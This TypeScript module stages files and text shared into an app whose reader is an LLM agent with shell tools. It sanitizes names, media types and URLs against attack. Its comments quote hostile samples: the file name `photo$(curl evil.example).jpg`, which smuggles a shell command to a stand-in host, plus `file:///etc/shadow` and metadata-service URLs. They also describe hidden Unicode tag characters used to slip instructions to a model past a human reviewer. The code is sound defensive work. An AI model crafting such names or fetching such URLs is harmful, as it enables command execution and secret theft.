import { parseImportedTrack, MAX_ROUTE_BYTES, summarizeTrack, type ImportedTrack } from "@schlessera/brain-geo";
import { createHash } from "node:crypto";
import type { Logger } from "@opentelemetry/api-logs";
import { mkdir, readdir, rename, rm, writeFile, realpath, lstat } from "node:fs/promises";
import { join } from "node:path";
import {
  SHARE_MAX_FILES,
  SHARE_MAX_FILE_BYTES,
  SHARE_MAX_STAGED,
  SHARE_MAX_TEXT_BYTES,
  SHARE_MAX_TOTAL_BYTES,
  SHARE_STAGING_DIR,
  SHARE_STAGING_TTL_MS,
  type SharedFileMeta,
  type ShareIntakeResult,
  type ShareStagingManifest,
  type QueueStagingManifest,
} from "@schlessera/brain-ui-sdk/protocol";
import { safeResolve } from "../files/walker.js";

/**
 * Staging for an incoming system share.
 *
 * Everything a share carries is attacker-influenced: file names come from
 * whichever app invoked the share sheet, and the text is whatever page the user
 * was looking at. So the payload lands in a directory whose name the SERVER
 * mints, under a dot-directory that is gitignored and hidden from the file
 * browser, and nothing in it is ever trusted to be a path.
 *
 * The consumer is an LLM agent with file and shell tools, which sets the bar
 * for "sanitized": a name is not safe merely because the filesystem accepts it.
 * It also has to be safe unquoted in a shell, and free of characters that are
 * invisible to the human reviewing what the agent is about to do.
 */

export class EmptyShareError extends Error {
  constructor() {
    super("empty_share");
    this.name = "EmptyShareError";
  }
}

export type ShareLimitReason =
  | "too_many_files"
  | "file_too_large"
  | "share_too_large"
  | "text_too_large"
  | "inbox_full";

export class ShareTooLargeError extends Error {
  constructor(
    /** Machine-readable reason, returned to the client verbatim. */
    public reason: ShareLimitReason,
    public limit: number
  ) {
    super(reason);
    this.name = "ShareTooLargeError";
  }
}

/**
 * Everything a stored name may contain: letters, digits, combining marks, and
 * `._-`. An ALLOWLIST, not a denylist, because the consumer is an agent that
 * may paste this name into a shell — `photo$(curl evil.example).jpg` survives
 * any list of "unsafe characters" someone thinks to write down, and correct
 * quoting by the agent is not a security boundary. Unicode letters are kept so
 * a CJK or accented name survives as itself.
 */
const NAME_DISALLOWED = /[^\p{L}\p{N}\p{M}._-]+/gu;
/**
 * Format characters: zero-width spaces, bidi overrides (`photo<RLO>gnp.exe`
 * reads as `photo.exe` and runs as `photoexe.png`), and the Unicode tag block
 * U+E0000-E007F — the standard channel for smuggling instructions past a human
 * into a model's tokenizer. Every field of a share is quoted into a prompt, so
 * these are stripped from text as well as from names. This repo already bans
 * raw invisible characters in its own source; a share is where they arrive from
 * outside.
 */
const FORMAT_CHARS = /\p{Cf}/gu;
/** C0/C1 controls and DEL — never legal in a stored file name. */
const CONTROL_CHARS = /[\u0000-\u001f\u007f-\u009f]/g;
/** Same, minus tab/newline/carriage return, which shared text legitimately holds. */
const CONTROL_CHARS_KEEP_WHITESPACE =
  /[\u0000-\u0008\u000b\u000c\u000e-\u001f\u007f-\u009f]/g;

/** A media type the manifest is willing to quote back. */
const MEDIA_TYPE_PATTERN =
  /^[a-z0-9][a-z0-9!#$&^_.+-]{0,60}\/[a-z0-9][a-z0-9!#$&^_.+-]{0,60}$/;

const EXTENSION_BY_TYPE: Record<string, string> = {
  "application/gpx+xml": ".gpx",
  "application/vnd.google-earth.kml+xml": ".kml",
  "application/geo+json": ".geojson",
  "image/jpeg": ".jpg",
  "image/png": ".png",
  "image/gif": ".gif",
  "image/webp": ".webp",
  "image/heic": ".heic",
  "image/heif": ".heif",
  "image/svg+xml": ".svg",
  "application/pdf": ".pdf",
  "text/plain": ".txt",
  "text/markdown": ".md",
  "text/html": ".html",
  "text/csv": ".csv",
  "application/json": ".json",
  "audio/mpeg": ".mp3",
  "audio/mp4": ".m4a",
  "audio/ogg": ".ogg",
  "audio/wav": ".wav",
  "video/mp4": ".mp4",
  "video/webm": ".webm",
};

/**
 * Bound on a stored name, in UTF-8 BYTES rather than characters: a filesystem
 * component limit is a byte limit (255 on ext4/APFS), and 100 CJK characters
 * are ~300 bytes. Counting characters would let a legitimate share fail the
 * write with ENAMETOOLONG.
 */
const MAX_NAME_BYTES = 100;
const DEFAULT_MEDIA_TYPE = "application/octet-stream";
/** A partial directory older than this was orphaned by a crash mid-write. */
const PARTIAL_TTL_MS = 60 * 60 * 1000;

export class UnsupportedTrackError extends Error {
  constructor() { super("Not a validated GPX, KML or supported GeoJSON track."); this.name = "UnsupportedTrackError"; }
}

export interface ShareInput {
  /** Internal composer admission policy; ordinary share intake keeps its behavior. */
  tracksOnly?: boolean;
  /** Cancel an uncommitted composer upload; never serialized into its manifest. */
  signal?: AbortSignal;
  title?: string | undefined;
  text?: string | undefined;
  url?: string | undefined;
  files: File[];
}

/** Absolute staging root inside the given brain repo. */
export function shareStagingRoot(brainPath: string): string {
  return join(brainPath, SHARE_STAGING_DIR);
}

/**
 * Normalize a media type, or fall back to the generic one.
 *
 * Validated rather than merely lowercased: the value is attacker-supplied, ends
 * up in `meta.json`, and is quoted into the agent's prompt next to the file
 * name. An unbounded string there is a place to hide a paragraph of text.
 */
function bareMediaType(raw: string | undefined): string {
  const bare = (raw ?? "").split(";")[0]!.trim().toLowerCase();
  return MEDIA_TYPE_PATTERN.test(bare) ? bare : DEFAULT_MEDIA_TYPE;
}

function utf8Length(value: string): number {
  return Buffer.byteLength(value, "utf-8");
}

/** Truncate on a code-point boundary so no surrogate pair is cut in half. */
function truncateToBytes(value: string, maxBytes: number): string {
  let out = "";
  let bytes = 0;
  for (const char of value) {
    const size = utf8Length(char);
    if (bytes + size > maxBytes) break;
    out += char;
    bytes += size;
  }
  return out || Array.from(value)[0] || "file";
}

/**
 * Reduce whatever the sharing app called a file to a plain name that cannot
 * escape its directory, hide itself, or do anything in a shell.
 *
 * Path separators are dropped rather than replaced: a name is a name, and the
 * only directory a staged file may land in is the one this module just made.
 */
export function sanitizeFileName(raw: string, mediaType: string): string {
  const lastSegment = (raw ?? "").split(/[/\\]/).pop() ?? "";
  let name = lastSegment
    .replace(CONTROL_CHARS, "")
    .replace(FORMAT_CHARS, "")
    .replace(NAME_DISALLOWED, "-")
    // Collapse the runs the substitution above can produce.
    .replace(/-{2,}/g, "-")
    // Leading dots would produce `..`, or a hidden file the agent never sees;
    // a leading dash reads as an option to every command line it appears on.
    .replace(/^[.-]+/, "")
    .replace(/[.\s]+$/, "");

  if (!name) name = "file";

  const extMatch = name.match(/\.[A-Za-z0-9]{1,8}$/);
  let stem = extMatch ? name.slice(0, -extMatch[0].length) : name;
  const ext = extMatch
    ? extMatch[0].toLowerCase()
    : (EXTENSION_BY_TYPE[bareMediaType(mediaType)] ?? "");

  if (!stem) stem = "file";
  const budget = MAX_NAME_BYTES - utf8Length(ext);
  if (utf8Length(stem) > budget) stem = truncateToBytes(stem, Math.max(1, budget));
  return stem + ext;
}

/**
 * Two `photo.jpg` become `photo.jpg` and `photo-2.jpg`.
 *
 * Reservations are compared case-INSENSITIVELY: on macOS and Windows a file
 * called `META.JSON` is the same file as `meta.json`, so a case-sensitive
 * comparison would let a share overwrite the manifest (or the manifest
 * overwrite the share, leaving the manifest describing a file that is gone).
 */
function deduplicate(name: string, used: Set<string>): string {
  const claim = (candidate: string): boolean => {
    const key = candidate.toLowerCase();
    if (used.has(key)) return false;
    used.add(key);
    return true;
  };

  if (claim(name)) return name;

  const extMatch = name.match(/\.[A-Za-z0-9]{1,8}$/);
  const ext = extMatch ? extMatch[0] : "";
  const stem = extMatch ? name.slice(0, -ext.length) : name;
  for (let n = 2; ; n += 1) {
    const candidate = `${stem}-${n}${ext}`;
    if (claim(candidate)) return candidate;
  }
}

function cleanTextField(value: string | undefined): string | undefined {
  if (value === undefined) return undefined;
  const cleaned = value
    .replace(CONTROL_CHARS_KEEP_WHITESPACE, "")
    .replace(FORMAT_CHARS, "")
    .trim();
  if (!cleaned) return undefined;
  if (utf8Length(cleaned) > SHARE_MAX_TEXT_BYTES) {
    throw new ShareTooLargeError("text_too_large", SHARE_MAX_TEXT_BYTES);
  }
  return cleaned;
}

/**
 * Keep a shared URL only if it is one the agent may safely dereference.
 *
 * The filing skill fetches this. `javascript:`, `data:`, `file:///etc/shadow`
 * and `http://169.254.169.254/…` all arrive as plausible-looking strings, so
 * anything that is not http(s) is demoted to plain text: still visible to the
 * user and the agent, no longer something a fetch tool will act on.
 */
function splitUrl(raw: string | undefined): { url?: string; leftover?: string } {
  if (!raw) return {};
  try {
    const parsed = new URL(raw);
    if (parsed.protocol === "http:" || parsed.protocol === "https:") {
      return { url: parsed.toString() };
    }
  } catch {
    // Not a URL at all — treat it as the text it is.
  }
  return { leftover: raw };
}

/** How many shares are staged right now (partials excluded). */
async function countStaged(root: string): Promise<number> {
  try {
    const entries = await readdir(root, { withFileTypes: true });
    return entries.filter((e) => e.isDirectory() && !e.name.startsWith(".")).length;
  } catch {
    return 0;
  }
}

/**
 * Write one share to its own staging directory and return the manifest.
 *
 * Staged into `.<id>.partial` and renamed into place only once `meta.json` is
 * written. The rename is atomic within a filesystem, so the agent can never
 * observe a share that is missing files or a manifest — not even if the process
 * is killed mid-write, which `try/catch` cleanup cannot cover.
 */
export async function stageShare(
  brainPath: string,
  input: ShareInput,
  log?: Logger
): Promise<ShareIntakeResult> {
  return stageShareAt(brainPath, input, crypto.randomUUID(), log);
}

/** Internal recovery entry. Callers obtain this ID from the operational store. */
export async function stageShareAt(
  brainPath: string,
  input: ShareInput,
  id: string,
  log?: Logger,
  source: "web-share-target" | "cli" = "web-share-target"
): Promise<ShareIntakeResult> {
  if (!/^[a-f0-9-]{36}$/.test(id)) throw new Error("Invalid staging id");
  input.signal?.throwIfAborted();
  const title = cleanTextField(input.title);
  const rawUrl = cleanTextField(input.url);
  const { url, leftover } = splitUrl(rawUrl);
  const text = cleanTextField(
    leftover ? [input.text, leftover].filter(Boolean).join("\n") : input.text
  );
  const files = input.files;

  if (!title && !text && !url && files.length === 0) {
    throw new EmptyShareError();
  }
  if (files.length > SHARE_MAX_FILES) {
    throw new ShareTooLargeError("too_many_files", SHARE_MAX_FILES);
  }

  let declaredTotal = 0;
  for (const file of files) {
    if (file.size > SHARE_MAX_FILE_BYTES) {
      throw new ShareTooLargeError("file_too_large", SHARE_MAX_FILE_BYTES);
    }
    declaredTotal += file.size;
  }
  if (declaredTotal > SHARE_MAX_TOTAL_BYTES) {
    throw new ShareTooLargeError("share_too_large", SHARE_MAX_TOTAL_BYTES);
  }

  const root = await safeResolve(SHARE_STAGING_DIR, brainPath);
  if ((await countStaged(root)) >= SHARE_MAX_STAGED) {
    throw new ShareTooLargeError("inbox_full", SHARE_MAX_STAGED);
  }

  const dir = `${SHARE_STAGING_DIR}/${id}`;
  const finalDir = join(root, id);
  const partialDir = join(root, `.${id}.partial`);
  await mkdir(partialDir, { recursive: true });

  try {
    // meta.json is reserved: a shared file called that must not overwrite it.
    const used = new Set<string>(["meta.json"]);
    const staged: SharedFileMeta[] = [];
    const skipped: string[] = [];
    let total = 0;

    for (const file of files) {
      const mediaType = bareMediaType(file.type);
      const bytes = Buffer.from(await file.arrayBuffer());
      input.signal?.throwIfAborted();
      if (input.tracksOnly && bytes.byteLength > MAX_ROUTE_BYTES) throw new ShareTooLargeError("file_too_large", MAX_ROUTE_BYTES);

      // `file.size` is a claim; the decoded length is the fact. Re-check both
      // caps against it so a lying multipart part cannot slip past the gate.
      if (bytes.byteLength > SHARE_MAX_FILE_BYTES) {
        throw new ShareTooLargeError("file_too_large", SHARE_MAX_FILE_BYTES);
      }
      total += bytes.byteLength;
      if (total > SHARE_MAX_TOTAL_BYTES) {
        throw new ShareTooLargeError("share_too_large", SHARE_MAX_TOTAL_BYTES);
      }

      let imported: ImportedTrack | undefined;
      try { imported = parseImportedTrack(new TextDecoder("utf-8", { fatal: true }).decode(bytes)); }
      catch { if (input.tracksOnly) throw new UnsupportedTrackError(); }
      // Generic incoming extensions do not identify a track. Validated content does.
      const incoming = file.name.replace(CONTROL_CHARS, "").replace(FORMAT_CHARS, "");
      const incomingName = incoming ? truncateToBytes(incoming, MAX_NAME_BYTES) : "";
      let stored = sanitizeFileName(file.name, mediaType);
      if (imported && (!/\.[a-z0-9]{1,8}$/i.test(file.name) || /\.(?:bin|dat|tmp|xml|json)$/i.test(file.name))) {
        const stem = stored.replace(/\.[a-z0-9]{1,8}$/i, "");
        stored = sanitizeFileName(stem, { gpx: "application/gpx+xml", kml: "application/vnd.google-earth.kml+xml", geojson: "application/geo+json" }[imported.format]);
      }
      const name = deduplicate(stored, used);
      const path = `${dir}/${name}`;
      let trackMeta = {};
      if (imported) {
        const { geometry: _geometry, ...summary } = summarizeTrack(imported.track, { kind: "file", path });
        trackMeta = { incomingName, sha256: createHash("sha256").update(bytes).digest("hex"), detected: imported.format,
          summary: { ...summary, waypointCount: imported.waypointCount, waypointOmitted: imported.waypointOmissions.length } };
      }
      try {
        // "wx": never follow a link, never truncate something that exists. In a
        // freshly minted directory nothing can pre-exist, so this is a loud
        // assertion rather than a fix — which is the point.
        await writeFile(join(partialDir, name), bytes, { flag: "wx" });
      } catch (err) {
        // One unwritable file (ENOSPC, a stricter filesystem) must not throw
        // away the other four. Record it and carry on; the share is only lost
        // if nothing at all survives.
        log?.emit({
          severityText: "ERROR",
          body: "could not stage a shared file",
          attributes: { name, error: err instanceof Error ? err.message : String(err) },
        });
        skipped.push(name);
        continue;
      }

      staged.push({
        name,
        path,
        ...trackMeta,
        mediaType,
        bytes: bytes.byteLength,
      });
    }

    if (staged.length === 0 && !title && !text && !url) {
      throw new Error("share_write_failed");
    }

    const manifest: ShareStagingManifest | QueueStagingManifest = {
      id,
      dir,
      receivedAt: Date.now(),
      source,
      ...(title ? { title } : {}),
      ...(text ? { text } : {}),
      ...(url ? { url } : {}),
      files: staged,
      ...(skipped.length ? { skipped } : {}),
    };
    await writeFile(
      join(partialDir, "meta.json"),
      `${JSON.stringify(manifest, null, 2)}\n`,
      "utf-8"
    );

    // The share becomes visible here, whole, in one operation.
    input.signal?.throwIfAborted();
    await rename(partialDir, finalDir);
    if (input.signal?.aborted) {
      await rm(finalDir, { recursive: true, force: true });
      input.signal.throwIfAborted();
    }

    const { source: _source, ...result } = manifest;
    return result;
  } catch (err) {
    await rm(partialDir, { recursive: true, force: true }).catch(() => {});
    throw err;
  }
}

/**
 * Remove staged shares older than the TTL, and partial directories orphaned by
 * a crash mid-write.
 *
 * Called opportunistically on each intake (debounced) and exported so a
 * deployment can sweep at boot too — scheduling belongs to the container
 * crontab, and this sweep is cheap and bounded.
 */
export async function pruneShareStaging(
  brainPath: string,
  now = Date.now(),
  log?: Logger,
  protectedIds: ReadonlySet<string> = new Set()
): Promise<number> {
  let root: string;
  let entries;
  try {
    root = await safeResolve(SHARE_STAGING_DIR, brainPath);
    // Even an internal symlink could point at unrelated content. Only prune
    // the actual staging directory; the brain root itself may be a symlink.
    if (await realpath(root) !== join(await realpath(brainPath), SHARE_STAGING_DIR)) {
      throw new Error("Share staging directory must not traverse a symlink");
    }
    entries = await readdir(root, { withFileTypes: true });
  } catch (err) {
    // Nothing staged yet is the ordinary case. Anything else — a permission
    // problem, a file where the directory should be — must not masquerade as
    // "nothing to do", or pruning stops forever and silently.
    if ((err as NodeJS.ErrnoException).code !== "ENOENT") {
      log?.emit({
        severityText: "ERROR",
        body: "cannot read the share staging root",
        attributes: { error: err instanceof Error ? err.message : String(err) },
      });
    }
    return 0;
  }

  let removed = 0;
  for (const entry of entries) {
    if (!entry.isDirectory() || protectedIds.has(entry.name) ||
        protectedIds.has(entry.name.replace(/^\./, "").replace(/\.partial$/, ""))) continue;
    const path = join(root, entry.name);
    const ttl = entry.name.startsWith(".") ? PARTIAL_TTL_MS : SHARE_STAGING_TTL_MS;
    try {
      await safeResolve(`${SHARE_STAGING_DIR}/${entry.name}`, brainPath);
      const info = await lstat(path);
      if (!info.isDirectory() || now - info.mtimeMs <= ttl) continue;
      await rm(path, { recursive: true, force: true });
      removed += 1;
    } catch {
      // A directory that vanished mid-sweep is the outcome we wanted anyway.
    }
  }
  return removed;
}

/** Content identity excludes server IDs/timestamps and includes actual file bytes. */
export async function shareContentHash(input: ShareInput): Promise<string> {
  const title = cleanTextField(input.title);
  const { url, leftover } = splitUrl(cleanTextField(input.url));
  const text = cleanTextField(leftover ? [input.text, leftover].filter(Boolean).join("\n") : input.text);
  if (!title && !text && !url && input.files.length === 0) throw new EmptyShareError();
  if (input.files.length > SHARE_MAX_FILES) throw new ShareTooLargeError("too_many_files", SHARE_MAX_FILES);
  const hash = createHash("sha256").update(JSON.stringify([title ?? null, text ?? null, url ?? null]));
  const names = new Set<string>(["meta.json"]);
  let total = 0;
  for (const file of input.files) {
    if (file.size > SHARE_MAX_FILE_BYTES) throw new ShareTooLargeError("file_too_large", SHARE_MAX_FILE_BYTES);
    const bytes = Buffer.from(await file.arrayBuffer());
    if (bytes.length > SHARE_MAX_FILE_BYTES) throw new ShareTooLargeError("file_too_large", SHARE_MAX_FILE_BYTES);
    total += bytes.length;
    if (total > SHARE_MAX_TOTAL_BYTES) throw new ShareTooLargeError("share_too_large", SHARE_MAX_TOTAL_BYTES);
    const type = bareMediaType(file.type);
    hash.update(JSON.stringify([deduplicate(sanitizeFileName(file.name, type), names), type, bytes.length]));
    hash.update(bytes);
  }
  return hash.digest("hex");
}
